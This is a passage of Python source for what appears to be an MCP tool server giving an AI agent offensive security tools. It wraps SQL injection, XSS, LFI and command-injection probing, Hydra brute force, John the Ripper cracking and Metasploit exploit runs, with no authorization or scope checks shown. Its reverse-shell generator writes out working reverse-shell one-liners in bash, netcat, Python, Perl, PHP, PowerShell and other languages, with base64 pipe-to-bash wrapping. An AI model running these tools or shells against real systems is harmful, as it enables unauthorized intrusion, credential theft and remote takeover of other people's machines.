        "injection_points": injection_points,
        "databases": databases,
        "dumped_files": dumped_files,
        "raw_output": result["stdout"][:3000],
        "errors": result["stderr"] if result["stderr"] else None
    }
    
    log_tool_execution("sqlmap_scan", inputs, output)
    return json.dumps(output, indent=2)

@mcp.tool()
@resolve_references
async def sql_injection_test(
    url: str,
    param: str,
    method: str = "GET",
    data: Optional[str] = None,
    db_type: str = "generic",
    custom_payloads: Optional[List[str]] = None,
    timeout: int = 300
) -> str:
    """
    Manual SQL injection testing with custom payloads
    Tests for various SQL injection types with intelligent detection
    """
    inputs = {"url": url, "param": param, "method": method, "db_type": db_type}
    
    payloads = custom_payloads or PayloadGenerator.sql_injection_payloads(db_type)
    
    results = []
    vulnerable_payloads = []
    
    for payload in payloads:
        encoded_payload = urllib.parse.quote(payload)
        
        if method.upper() == "GET":
            if '?' in url:
                test_url = f"{url}&{param}={encoded_payload}"
            else:
                test_url = f"{url}?{param}={encoded_payload}"
            cmd = ["curl", "-s", "-k", "--max-time", "15", "-A", "Mozilla/5.0", test_url]
        else:
            test_data = f"{param}={encoded_payload}"
            if data:
                test_data = f"{data}&{test_data}"
            cmd = ["curl", "-s", "-k", "--max-time", "15", "-X", "POST", "-d", test_data, "-A", "Mozilla/5.0", url]
        
        result = run_command_advanced(cmd, timeout=20)
        
        response = result["stdout"]
        response_lower = response.lower()
        
        # Detection indicators
        sql_errors = [
            "sql syntax", "mysql", "sqlite", "postgresql", "oracle",
            "microsoft sql", "odbc", "syntax error", "unclosed quotation",
            "quoted string not properly terminated", "sqlstate",
            "pg_query", "mysql_fetch", "mysqli", "pdo", "database error"
        ]
        
        success_indicators = [
            "root:x:0:0", "admin", "password", "username",
            "table_name", "column_name", "information_schema"
        ]
        
        error_based = any(err in response_lower for err in sql_errors)
        data_leaked = any(ind in response_lower for ind in success_indicators)
        
        test_result = {
            "payload": payload,
            "response_length": len(response),
            "error_based": error_based,
            "data_leaked": data_leaked,
            "vulnerable": error_based or data_leaked,
            "confidence": "high" if data_leaked else ("medium" if error_based else "low")
        }
        
        if test_result["vulnerable"]:
            test_result["response_preview"] = response[:500]
            vulnerable_payloads.append(test_result)
        
        results.append(test_result)
    
    output = {
        "status": "success",
        "target": url,
        "parameter": param,
        "method": method,
        "payloads_tested": len(payloads),
        "vulnerable": len(vulnerable_payloads) > 0,
        "summary": {
            "total_tested": len(payloads),
            "vulnerable_payloads": len(vulnerable_payloads),
            "error_based": len([r for r in results if r["error_based"]]),
            "data_leaked": len([r for r in results if r["data_leaked"]])
        },
        "vulnerable_payloads": vulnerable_payloads,
        "all_results": results[:20]  # Limit output
    }
    
    log_tool_execution("sql_injection_test", inputs, output)
    return json.dumps(output, indent=2)

# ============================================================================
# XSS AND INJECTION TESTING
# ============================================================================

@mcp.tool()
@resolve_references
async def xss_scan(
    url: str,
    param: str,
    method: str = "GET",
    data: Optional[str] = None,
    custom_payloads: Optional[List[str]] = None,
    timeout: int = 300
) -> str:
    """
    Cross-Site Scripting (XSS) vulnerability testing
    Tests for reflected, stored, and DOM-based XSS
    """
    inputs = {"url": url, "param": param, "method": method}
    
    payloads = custom_payloads or PayloadGenerator.xss_payloads()
    
    results = []
    vulnerable_payloads = []
    
    for payload in payloads:
        encoded_payload = urllib.parse.quote(payload)
        
        if method.upper() == "GET":
            if '?' in url:
                test_url = f"{url}&{param}={encoded_payload}"
            else:
                test_url = f"{url}?{param}={encoded_payload}"
            cmd = ["curl", "-s", "-k", "--max-time", "10", test_url]
        else:
            test_data = f"{param}={encoded_payload}"
            if data:
                test_data = f"{data}&{test_data}"
            cmd = ["curl", "-s", "-k", "--max-time", "10", "-X", "POST", "-d", test_data, url]
        
        result = run_command_advanced(cmd, timeout=15)
        response = result["stdout"]
        
        # Check if payload is reflected
        reflected = payload in response or urllib.parse.unquote(encoded_payload) in response
        
        # Check for XSS indicators
        xss_indicators = ["<script", "onerror=", "onload=", "javascript:", "alert(", "document."]
        indicator_found = any(ind.lower() in response.lower() for ind in xss_indicators)
        
        test_result = {
            "payload": payload,
            "reflected": reflected,
            "indicator_found": indicator_found,
            "vulnerable": reflected and indicator_found,
            "response_length": len(response),
            "confidence": "high" if (reflected and indicator_found) else ("medium" if reflected else "low")
        }
        
        if test_result["vulnerable"]:
            test_result["response_preview"] = response[:300]
            vulnerable_payloads.append(test_result)
        
        results.append(test_result)
    
    output = {
        "status": "success",
        "target": url,
        "parameter": param,
        "method": method,
        "payloads_tested": len(payloads),
        "vulnerable": len(vulnerable_payloads) > 0,
        "summary": {
            "total_tested": len(payloads),
            "reflected": len([r for r in results if r["reflected"]]),
            "vulnerable": len(vulnerable_payloads)
        },
        "vulnerable_payloads": vulnerable_payloads,
        "all_results": results[:15]
    }
    
    log_tool_execution("xss_scan", inputs, output)
    return json.dumps(output, indent=2)

@mcp.tool()
@resolve_references
async def lfi_scan(
    url: str,
    param: str,
    custom_payloads: Optional[List[str]] = None,
    timeout: int = 300
) -> str:
    """
    Local File Inclusion (LFI) vulnerability testing
    Tests with various encoding bypass techniques
    """
    inputs = {"url": url, "param": param}
    
    payloads = custom_payloads or PayloadGenerator.lfi_payloads()
    
    results = []
    vulnerable_payloads = []
    
    # Success indicators for different file types
    file_indicators = {
        "passwd": ["root:x:0:0", "daemon:", "nobody:", "www-data:"],
        "hosts": ["127.0.0.1", "localhost"],
        "shadow": ["root:", "$6$", "$y$"],
        "config": ["[mysqld]", "DocumentRoot", "server_name", "DB_PASSWORD"]
    }
    
    for payload in payloads:
        if '?' in url:
            test_url = f"{url}&{param}={urllib.parse.quote(payload)}"
        else:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
        
        cmd = ["curl", "-s", "-k", "--max-time", "10", "-A", "Mozilla/5.0", test_url]
        result = run_command_advanced(cmd, timeout=15)
        response = result["stdout"]
        response_lower = response.lower()
        
        # Check for file content indicators
        file_type = None
        indicators_found = []
        
        for ftype, indicators in file_indicators.items():
            for indicator in indicators:
                if indicator.lower() in response_lower:
                    file_type = ftype
                    indicators_found.append(indicator)
        
        vulnerable = len(indicators_found) > 0
        
        test_result = {
            "payload": payload,
            "vulnerable": vulnerable,
            "file_type": file_type,
            "indicators_found": indicators_found,
            "response_length": len(response),
            "confidence": "high" if len(indicators_found) > 1 else ("medium" if vulnerable else "low")
        }
        
        if vulnerable:
            test_result["response_preview"] = response[:500]
            vulnerable_payloads.append(test_result)
        
        results.append(test_result)
    
    output = {
        "status": "success",
        "target": url,
        "parameter": param,
        "payloads_tested": len(payloads),
        "vulnerable": len(vulnerable_payloads) > 0,
        "summary": {
            "total_tested": len(payloads),
            "vulnerable": len(vulnerable_payloads),
            "file_types_found": list(set(r["file_type"] for r in vulnerable_payloads if r["file_type"]))
        },
        "vulnerable_payloads": vulnerable_payloads,
        "all_results": results[:15]
    }
    
    log_tool_execution("lfi_scan", inputs, output)
    return json.dumps(output, indent=2)

@mcp.tool()
@resolve_references
async def command_injection_test(
    url: str,
    param: str,
    method: str = "GET",
    data: Optional[str] = None,
    custom_payloads: Optional[List[str]] = None,
    timeout: int = 300
) -> str:
    """
    Command injection vulnerability testing
    Tests for OS command injection with various bypass techniques
    """
    inputs = {"url": url, "param": param, "method": method}
    
    payloads = custom_payloads or PayloadGenerator.command_injection_payloads()
    
    results = []
    vulnerable_payloads = []
    
    # Command output indicators
    cmd_indicators = {
        "whoami": ["root", "www-data", "apache", "nginx", "admin"],
        "id": ["uid=", "gid=", "groups="],
        "uname": ["Linux", "Darwin", "Windows"],
        "passwd": ["root:x:0:0", "daemon:"],
        "ls": ["bin", "etc", "var", "usr", "home"]
    }
    
    for payload in payloads:
        encoded_payload = urllib.parse.quote(payload)
        
        if method.upper() == "GET":
            if '?' in url:
                test_url = f"{url}&{param}={encoded_payload}"
            else:
                test_url = f"{url}?{param}={encoded_payload}"
            cmd = ["curl", "-s", "-k", "--max-time", "15", test_url]
        else:
            test_data = f"{param}={encoded_payload}"
            if data:
                test_data = f"{data}&{test_data}"
            cmd = ["curl", "-s", "-k", "--max-time", "15", "-X", "POST", "-d", test_data, url]
        
        result = run_command_advanced(cmd, timeout=20)
        response = result["stdout"]
        response_lower = response.lower()
        
        # Check for command output
        indicators_found = []
        for cmd_type, indicators in cmd_indicators.items():
            for indicator in indicators:
                if indicator.lower() in response_lower:
                    indicators_found.append(f"{cmd_type}:{indicator}")
        
        vulnerable = len(indicators_found) > 0
        
        test_result = {
            "payload": payload,
            "vulnerable": vulnerable,
            "indicators_found": indicators_found,
            "response_length": len(response),
            "confidence": "high" if len(indicators_found) > 1 else ("medium" if vulnerable else "low")
        }
        
        if vulnerable:
            test_result["response_preview"] = response[:500]
            vulnerable_payloads.append(test_result)
        
        results.append(test_result)
    
    output = {
        "status": "success",
        "target": url,
        "parameter": param,
        "method": method,
        "payloads_tested": len(payloads),
        "vulnerable": len(vulnerable_payloads) > 0,
        "summary": {
            "total_tested": len(payloads),
            "vulnerable": len(vulnerable_payloads)
        },
        "vulnerable_payloads": vulnerable_payloads,
        "all_results": results[:15]
    }
    
    log_tool_execution("command_injection_test", inputs, output)
    return json.dumps(output, indent=2)


# ============================================================================
# BRUTE FORCE AND PASSWORD CRACKING
# ============================================================================

@mcp.tool()
@resolve_references
async def hydra_attack(
    target: str,
    service: str,
    username: Optional[str] = None,
    userlist: Optional[str] = None,
    password: Optional[str] = None,
    passlist: Optional[str] = "/usr/share/wordlists/rockyou.txt",
    port: Optional[int] = None,
    threads: int = 16,
    additional_args: str = "",
    timeout: int = 1800
) -> str:
    """
    Advanced brute force attack with Hydra
    
    Supported services:
    - ssh, ftp, telnet, smtp, pop3, imap
    - http-get, http-post, http-form-get, http-form-post
    - mysql, mssql, postgres, oracle
    - smb, rdp, vnc, ldap
    - and many more...
    """
    inputs = {
        "target": target, "service": service, "username": username,
        "userlist": userlist, "threads": threads
    }
    
    if not (username or userlist):
        return json.dumps({"status": "error", "message": "Provide username or userlist"})
    
    if not (password or passlist):
        return json.dumps({"status": "error", "message": "Provide password or passlist"})
    
    timestamp = generate_timestamp()
    output_file = os.path.join(TOOL_LOG_DIR, f"hydra_{sanitize_filename(target)}_{service}_{timestamp}.txt")
    
    cmd = ["hydra"]
    
    if username:
        cmd.extend(["-l", username])
    elif userlist:
        cmd.extend(["-L", userlist])
    
    if password:
        cmd.extend(["-p", password])
    elif passlist:
        cmd.extend(["-P", passlist])
    
    cmd.extend(["-t", str(threads)])
    cmd.extend(["-o", output_file])
    cmd.extend(["-V"])  # Verbose
    
    if port:
        cmd.extend(["-s", str(port)])
    
    if additional_args:
        cmd.extend(shlex.split(additional_args))
    
    cmd.extend([target, service])
    
    result = run_command_advanced(cmd, timeout=timeout)
    
    # Parse results
    credentials_found = []
    
    # Parse output file
    if os.path.exists(output_file):
        try:
            with open(output_file, 'r') as f:
                for line in f:
                    if "login:" in line.lower() and "password:" in line.lower():
                        credentials_found.append(line.strip())
        except Exception as e:
            logger.error(f"Error reading hydra output: {e}")
    
    # Also parse stdout
    for line in result["stdout"].split('\n'):
        if "login:" in line.lower() and "password:" in line.lower():
            if line.strip() not in credentials_found:
                credentials_found.append(line.strip())
    
    output = {
        "status": "success" if result["success"] else "partial",
        "target": target,
        "service": service,
        "output_file": output_file,
        "execution_time": result["execution_time"],
        "credentials_found": len(credentials_found) > 0,
        "summary": {
            "credentials_count": len(credentials_found)
        },
        "credentials": credentials_found,
        "raw_output": result["stdout"][-2000:] if result["stdout"] else "",
        "errors": result["stderr"] if result["stderr"] else None
    }
    
    log_tool_execution("hydra_attack", inputs, output)
    return json.dumps(output, indent=2)

@mcp.tool()
@resolve_references
async def john_crack(
    hash_file: str,
    wordlist: str = "/usr/share/wordlists/rockyou.txt",
    format: Optional[str] = None,
    rules: Optional[str] = None,
    incremental: bool = False,
    show: bool = False,
    timeout: int = 3600
) -> str:
    """
    Password cracking with John the Ripper
    
    Common formats:
    - raw-md5, raw-sha1, raw-sha256, raw-sha512
    - bcrypt, md5crypt, sha256crypt, sha512crypt
    - nt, lm, ntlm
    - mysql, mssql, oracle
    - zip, rar, pdf
    """
    inputs = {
        "hash_file": hash_file, "wordlist": wordlist, "format": format,
        "rules": rules, "incremental": incremental
    }
    
    if show:
        cmd = ["john", "--show", hash_file]
        if format:
            cmd.extend([f"--format={format}"])
        result = run_command_advanced(cmd, timeout=60)
        
        cracked = []
        for line in result["stdout"].split('\n'):
            if ':' in line and not line.startswith('0 password'):
                cracked.append(line.strip())
        
        return json.dumps({
            "status": "success",
            "cracked_passwords": cracked,
            "count": len(cracked)
        }, indent=2)
    
    cmd = ["john", hash_file]
    
    if wordlist and not incremental:
        cmd.append(f"--wordlist={wordlist}")
    
    if format:
        cmd.append(f"--format={format}")
    
    if rules:
        cmd.append(f"--rules={rules}")
    
    if incremental:
        cmd.append("--incremental")
    
    result = run_command_advanced(cmd, timeout=timeout)
    
    # Get cracked passwords
    show_cmd = ["john", "--show", hash_file]
    if format:
        show_cmd.append(f"--format={format}")
    
    show_result = run_command_advanced(show_cmd, timeout=60)
    
    cracked = []
    for line in show_result["stdout"].split('\n'):
        if ':' in line and not line.startswith('0 password'):
            cracked.append(line.strip())
    
    output = {
        "status": "success" if result["success"] else "partial",
        "hash_file": hash_file,
        "execution_time": result["execution_time"],
        "cracked_count": len(cracked),
        "cracked_passwords": cracked,
        "raw_output": result["stdout"][-1500:] if result["stdout"] else "",
        "errors": result["stderr"] if result["stderr"] else None
    }
    
    log_tool_execution("john_crack", inputs, output)
    return json.dumps(output, indent=2)

# ============================================================================
# EXPLOITATION TOOLS
# ============================================================================

@mcp.tool()
@resolve_references
async def metasploit_exploit(
    module: str,
    rhosts: str,
    rport: Optional[int] = None,
    lhost: Optional[str] = None,
    lport: int = 4444,
    payload: Optional[str] = None,
    options: Optional[Dict[str, str]] = None,
    timeout: int = 600
) -> str:
    """
    Execute Metasploit exploit module
    
    Example modules:
    - exploit/multi/http/apache_mod_cgi_bash_env_exec
    - exploit/unix/ftp/vsftpd_234_backdoor
    - exploit/windows/smb/ms17_010_eternalblue
    - exploit/multi/http/tomcat_mgr_upload
    """
    inputs = {
        "module": module, "rhosts": rhosts, "rport": rport,
        "lhost": lhost, "lport": lport, "payload": payload, "options": options
    }
    
    # Build RC script
    rc_commands = [
        f"use {module}",
        f"set RHOSTS {rhosts}"
    ]
    
    if rport:
        rc_commands.append(f"set RPORT {rport}")
    
    if lhost:
        rc_commands.append(f"set LHOST {lhost}")
    
    rc_commands.append(f"set LPORT {lport}")
    
    if payload:
        rc_commands.append(f"set PAYLOAD {payload}")
    
    if options:
        for key, value in options.items():
            rc_commands.append(f"set {key} {value}")
    
    rc_commands.extend([
        "show options",
        "exploit -j",
        "sleep 10",
        "sessions -l",
        "exit"
    ])
    
    # Write RC file
    timestamp = generate_timestamp()
    rc_file = os.path.join(TOOL_LOG_DIR, f"msf_{sanitize_filename(module)}_{timestamp}.rc")
    
    with open(rc_file, 'w') as f:
        f.write('\n'.join(rc_commands))
    
    cmd = ["msfconsole", "-q", "-r", rc_file]
    result = run_command_advanced(cmd, timeout=timeout)
    
    # Parse results
    sessions = []
    exploit_success = False
    
    stdout = result["stdout"]
    
    if "session" in stdout.lower() and ("opened" in stdout.lower() or "created" in stdout.lower()):
        exploit_success = True
    
    # Extract session info
    session_pattern = r'(\d+)\s+(\w+)\s+(\S+)\s+(\S+)\s+(\S+)'
    for match in re.finditer(session_pattern, stdout):
        sessions.append({
            "id": match.group(1),
            "type": match.group(2),
            "info": match.group(3)
        })
    
    output = {
        "status": "success" if result["success"] else "partial",
        "module": module,
        "target": rhosts,
        "rc_file": rc_file,
        "execution_time": result["execution_time"],
        "exploit_success": exploit_success,
        "sessions": sessions,
        "raw_output": stdout[-3000:] if stdout else "",
        "errors": result["stderr"] if result["stderr"] else None
    }
    
    log_tool_execution("metasploit_exploit", inputs, output)
    return json.dumps(output, indent=2)

@mcp.tool()
@resolve_references
async def reverse_shell_generator(
    lhost: str,
    lport: int = 4444,
    shell_type: str = "bash",
    encoding: Optional[str] = None
) -> str:
    """
    Generate reverse shell payloads
    
    Shell types:
    - bash, sh, nc, ncat
    - python, python3, perl, ruby, php
    - powershell, cmd
    - java, groovy
    - awk, lua, telnet
    """
    inputs = {"lhost": lhost, "lport": lport, "shell_type": shell_type, "encoding": encoding}
    
    shells = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "bash_udp": f"bash -i >& /dev/udp/{lhost}/{lport} 0>&1",
        "sh": f"/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "nc": f"nc -e /bin/sh {lhost} {lport}",
        "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "ncat": f"ncat {lhost} {lport} -e /bin/bash",
        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "powershell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        "java": f"Runtime.getRuntime().exec(new String[]{{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"}})",
        "awk": f"awk 'BEGIN {{s = \"/inet/tcp/0/{lhost}/{lport}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null",
        "lua": f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
    }
    
    if shell_type not in shells:
        return json.dumps({
            "status": "error",
            "message": f"Unknown shell type. Available: {list(shells.keys())}"
        })
    
    payload = shells[shell_type]
    
    # Apply encoding if requested
    encoded_payloads = {}
    if encoding:
        if encoding == "base64":
            encoded_payloads["base64"] = base64.b64encode(payload.encode()).decode()
            encoded_payloads["base64_exec"] = f"echo {encoded_payloads['base64']} | base64 -d | bash"
        elif encoding == "url":
            encoded_payloads["url"] = urllib.parse.quote(payload)
        elif encoding == "hex":
            encoded_payloads["hex"] = payload.encode().hex()
    
    # Generate listener command
    listener_cmd = f"nc -lvnp {lport}"
    
    output = {
        "status": "success",
        "shell_type": shell_type,
        "lhost": lhost,
        "lport": lport,
        "payload": payload,
        "encoded_payloads": encoded_payloads,
        "listener_command": listener_cmd,
        "all_shells": shells
    }
    
    log_tool_execution("reverse_shell_generator", inputs, output)
    return json.dumps(output, indent=2)

# ============================================================================
# DNS AND SUBDOMAIN ENUMERATION
# ============================================================================

@mcp.tool()
@resolve_references
async def subdomain_enum(
    domain: str,
    tools: List[str] = ["subfinder", "amass"],
    wordlist: Optional[str] = None,
    output_file: Optional[str] = None,
    timeout: int = 900
) -> str:
    """
    Comprehensive subdomain enumeration using multiple tools
    """
    inputs = {"domain": domain, "tools": tools, "wordlist": wordlist}
    
    if not output_file:
        timestamp = generate_timestamp()
        output_file = os.path.join(TOOL_LOG_DIR, f"subdomains_{sanitize_filename(domain)}_{timestamp}.txt")
    
    all_subdomains = set()
    tool_results = {}
    
    for tool in tools:
        tool_output = os.path.join(TOOL_LOG_DIR, f"{tool}_{sanitize_filename(domain)}_{generate_timestamp()}.txt")
        
        if tool == "subfinder":
            cmd = ["subfinder", "-d", domain, "-o", tool_output, "-silent"]
        elif tool == "amass":
            cmd = ["amass", "enum", "-passive", "-d", domain, "-o", tool_output]
        elif tool == "assetfinder":
            cmd = ["assetfinder", "--subs-only", domain]
        elif tool == "findomain":
            cmd = ["findomain", "-t", domain, "-u", tool_output]
        else:
            continue
        
        result = run_command_advanced(cmd, timeout=timeout // len(tools))
        
        subdomains = set()
        
        # Parse from output file
        if os.path.exists(tool_output):
            with open(tool_output, 'r') as f:
                for line in f:
                    sub = line.strip()
                    if sub and domain in sub:
                        subdomains.add(sub)
        
        # Parse from stdout
        for line in result["stdout"].split('\n'):
            sub = line.strip()
            if sub and domain in sub:
                subdomains.add(sub)
        
        tool_results[tool] = {
            "count": len(subdomains),
            "subdomains": list(subdomains)
        }
        
        all_subdomains.update(subdomains)
    
    # Save combined results
    with open(output_file, 'w') as f:
        for sub in sorted(all_subdomains):
            f.write(f"{sub}\n")
    
    output = {
        "status": "success",
        "domain": domain,
        "output_file": output_file,
        "total_unique": len(all_subdomains),
        "tool_results": tool_results,
        "subdomains": sorted(list(all_subdomains))[:200]  # Limit output
    }
    
    log_tool_execution("subdomain_enum", inputs, output)
    return json.dumps(output, indent=2)

@mcp.tool()
@resolve_references
async def dns_recon(
    domain: str,
    record_types: List[str] = ["A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME"],
    output_file: Optional[str] = None,
    timeout: int = 300
) -> str:
    """
    DNS reconnaissance and record enumeration
    """
    inputs = {"domain": domain, "record_types": record_types}
    
    if not output_file:
        timestamp = generate_timestamp()
        output_file = os.path.join(TOOL_LOG_DIR, f"dns_{sanitize_filename(domain)}_{timestamp}.json")
    
    dns_records = {}
    
    for record_type in record_types:
        cmd = ["dig", "+short", record_type, domain]
        result = run_command_advanced(cmd, timeout=30)
        
        records = [r.strip() for r in result["stdout"].split('\n') if r.strip()]
        dns_records[record_type] = records
    
    # Zone transfer attempt
    zone_transfer = {"attempted": False, "success": False, "data": []}
    
    if "NS" in dns_records and dns_records["NS"]:
        zone_transfer["attempted"] = True
        for ns in dns_records["NS"][:3]:
            ns = ns.rstrip('.')
            cmd = ["dig", f"@{ns}", domain, "AXFR", "+short"]
            result = run_command_advanced(cmd, timeout=30)
            
            if result["stdout"] and "Transfer failed" not in result["stdout"]:
                zone_transfer["success"] = True
                zone_transfer["data"] = result["stdout"].split('\n')
                break
    
    # Save results
    with open(output_file, 'w') as f:
        json.dump({
            "domain": domain,
            "records": dns_records,
            "zone_transfer": zone_transfer
        }, f, indent=2)
    
    output = {
        "status": "success",
        "domain": domain,
        "output_file": output_file,
        "records": dns_records,
        "zone_transfer": zone_transfer,
        "summary": {
            "record_types_found": len([r for r in dns_records.values() if r]),
            "zone_transfer_vulnerable": zone_transfer["success"]
        }
    }
    
    log_tool_execution("dns_recon", inputs, output)
    return json.dumps(output, indent=2)


# ============================================================================
# ADVANCED RECONNAISSANCE
# ============================================================================

@mcp.tool()
@resolve_references
async def nuclei_scan(
    target: str,
    templates: Optional[str] = None,
    severity: str = "critical,high,medium",
    tags: Optional[str] = None,
    output_file: Optional[str] = None,
    rate_limit: int = 150,
    timeout: int = 900
) -> str:
    """
    Advanced vulnerability scanning with Nuclei
    
    Template categories:
    - cves: Known CVE vulnerabilities
    - exposures: Sensitive data exposures
    - misconfigurations: Security misconfigurations
    - takeovers: Subdomain takeover checks
    - default-logins: Default credential checks
    """
    inputs = {
        "target": target, "templates": templates, "severity": severity,
        "tags": tags, "rate_limit": rate_limit
    }
    
    if not output_file:
        timestamp = generate_timestamp()
        output_file = os.path.join(TOOL_LOG_DIR, f"nuclei_{sanitize_filename(target)}_{timestamp}.json")
    
    cmd = [
        "nuclei",
        "-u", target,
        "-severity", severity,
        "-json",
        "-o", output_file,
        "-rate-limit", str(rate_limit),
        "-timeout", "10",
        "-retries", "2"
    ]
    
    if templates:
        cmd.extend(["-t", templates])
    
    if tags:
        cmd.extend(["-tags", tags])
    
    result = run_command_advanced(cmd, timeout=timeout)
    
    # Parse results
    findings = []
    if os.path.exists(output_file):
        try:
            with open(output_file, 'r') as f:
                for line in f:
                    try:
                        finding = json.loads(line)
                        findings.append({
                            "template_id": finding.get("template-id"),
                            "name": finding.get("info", {}).get("name"),
                            "severity": finding.get("info", {}).get("severity"),
                            "matched_at": finding.get("matched-at"),
                            "description": finding.get("info", {}).get("description", "")[:200],
                            "tags": finding.get("info", {}).get("tags", [])
                        })
                    except json.JSONDecodeError:
                        continue
        except Exception as e:
            logger.error(f"Error parsing nuclei output: {e}")
    
    # Categorize by severity
    critical = [f for f in findings if f.get("severity") == "critical"]
    high = [f for f in findings if f.get("severity") == "high"]
    medium = [f for f in findings if f.get("severity") == "medium"]
    
    output = {
        "status": "success" if result["success"] else "partial",
        "target": target,
        "output_file": output_file,
        "execution_time": result["execution_time"],
        "summary": {
            "total_findings": len(findings),
            "critical": len(critical),
            "high": len(high),
            "medium": len(medium)
        },
        "critical_findings": critical,
        "high_findings": high,
        "all_findings": findings[:50],
        "errors": result["stderr"] if result["stderr"] else None
    }
    
    log_tool_execution("nuclei_scan", inputs, output)
    return json.dumps(output, indent=2)

@mcp.tool()
@resolve_references
async def wpscan_audit(
    url: str,
    enumerate: str = "vp,vt,u,dbe",
    api_token: Optional[str] = None,
    output_file: Optional[str] = None,
    timeout: int = 900
) -> str:
    """
    WordPress security audit with WPScan
    
    Enumerate options:
    - vp: Vulnerable plugins
    - vt: Vulnerable themes
    - u: Users
    - dbe: Database exports
    - cb: Config backups
    - ap: All plugins
    - at: All themes
    """
    inputs = {"url": url, "enumerate": enumerate}
    
    if not output_file:
        timestamp = generate_timestamp()
        output_file = os.path.join(TOOL_LOG_DIR, f"wpscan_{sanitize_filename(url)}_{timestamp}.json")
    
    cmd = [
        "wpscan",
        "--url", url,
        "--enumerate", enumerate,
        "--format", "json",
        "--output", output_file,
        "--disable-tls-checks",
        "--random-user-agent"
    ]
    
    if api_token:
        cmd.extend(["--api-token", api_token])
    
    result = run_command_advanced(cmd, timeout=timeout)
    
    # Parse results
    scan_data = {}
    if os.path.exists(output_file):
        try:
            with open(output_file, 'r') as f:
                scan_data = json.load(f)
        except Exception as e:
            logger.error(f"Error parsing wpscan output: {e}")
    
    # Extract key findings
    vulnerabilities = []
    users = []
    plugins = []
    themes = []
    
    if "interesting_findings" in scan_data:
        for finding in scan_data["interesting_findings"]:
            vulnerabilities.append({
                "type": finding.get("type"),
                "url": finding.get("url"),
                "description": finding.get("to_s")
            })
    
    if "users" in scan_data:
        users = [u.get("slug") for u in scan_data.get("users", [])]
    
    if "plugins" in scan_data:
        for name, data in scan_data.get("plugins", {}).items():
            plugin_info = {
                "name": name,
                "version": data.get("version", {}).get("number"),
                "vulnerabilities": len(data.get("vulnerabilities", []))
            }
            plugins.append(plugin_info)
    
    output = {
        "status": "success" if result["success"] else "partial",
        "target": url,
        "output_file": output_file,
        "execution_time": result["execution_time"],
        "summary": {
            "vulnerabilities": len(vulnerabilities),
            "users_found": len(users),
            "plugins_found": len(plugins),
            "themes_found": len(themes)
        },
        "vulnerabilities": vulnerabilities,
        "users": users,
        "plugins": plugins,
        "wordpress_version": scan_data.get("version", {}).get("number"),
        "errors": result["stderr"] if result["stderr"] else None
    }
    
    log_tool_execution("wpscan_audit", inputs, output)
    return json.dumps(output, indent=2)

@mcp.tool()
@resolve_references
async def ffuf_fuzz(
    url: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    method: str = "GET",
    data: Optional[str] = None,
    headers: Optional[Dict[str, str]] = None,
    match_codes: str = "200,204,301,302,307,401,403,405",
    filter_size: Optional[str] = None,
    threads: int = 40,
    output_file: Optional[str] = None,
    timeout: int = 600
) -> str:
    """
    Fast web fuzzer with ffuf
    Use FUZZ keyword in URL, data, or headers for fuzzing point
    """
    inputs = {
        "url": url, "wordlist": wordlist, "method": method,
        "data": data, "threads": threads
    }
    
    if not output_file:
        timestamp = generate_timestamp()
        output_file = os.path.join(TOOL_LOG_DIR, f"ffuf_{sanitize_filename(url)}_{timestamp}.json")
    
    cmd = [
        "ffuf",
        "-u", url,
        "-w", wordlist,
        "-mc", match_codes,
        "-t", str(threads),
        "-o", output_file,
        "-of", "json",
        "-timeout", "10"
    ]
    
    if method.upper() != "GET":
        cmd.extend(["-X", method.upper()])
    
    if data:
        cmd.extend(["-d", data])
    
    if headers:
        for key, value in headers.items():
            cmd.extend(["-H", f"{key}: {value}"])
    
    if filter_size:
        cmd.extend(["-fs", filter_size])
    
    result = run_command_advanced(cmd, timeout=timeout)
    
    # Parse results
    findings = []
    if os.path.exists(output_file):
        try:
            with open(output_file, 'r') as f:
                data = json.load(f)
                for res in data.get("results", []):
                    findings.append({
                        "input": res.get("input", {}).get("FUZZ"),
                        "url": res.get("url"),
                        "status": res.get("status"),
                        "length": res.get("length"),
